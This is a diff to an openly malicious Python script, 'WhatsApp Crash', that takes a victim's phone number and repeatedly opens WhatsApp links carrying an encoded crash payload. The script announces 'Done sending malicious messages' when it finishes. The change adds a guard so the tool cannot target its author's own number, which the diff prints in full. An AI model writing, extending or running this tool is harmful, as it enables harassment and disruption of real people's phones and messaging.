@@ -24,7 +24,7 @@ def loop():
     os.system("clear")
     head = pyfiglet.figlet_format("WhatsApp Crash")
     print(Fore.RED + head)
-    print(Fore.YELLOW + "Version 1.1".center(70))
+    print(Fore.YELLOW + "Version 1.2".center(70))
     print(Fore.CYAN + "\nThis tool was created by Spider Anongreyhat\n\nFind me on WhatsApp:+2349052863644👨‍💻👨‍💻\n\n\n")
     print(Fore.GREEN + "😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😈Wickedness Only😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😡☠️\n\n"
     )  
@@ -35,6 +35,9 @@ def loop():
     
     data = urllib.parse.urlencode(crash)
     VictimNumber = input (Fore.RED + " Enter target phone number [Including Country code]: ")
+    if VictimNumber == "+2349052863644":
+        print(Fore.YELLOW + "You can\'t use my script against me 😂😂😂")
+        exit()
     url = "https://wa.me/" + VictimNumber +"?" + data
     j = "xdg-open " + url
     try:
@@ -48,4 +51,5 @@ def loop():
       os.system(j)
       t. sleep(15)
     print(Fore.GREEN + "Done sending malicious messages to " + VictimNumber)
+
 loop()
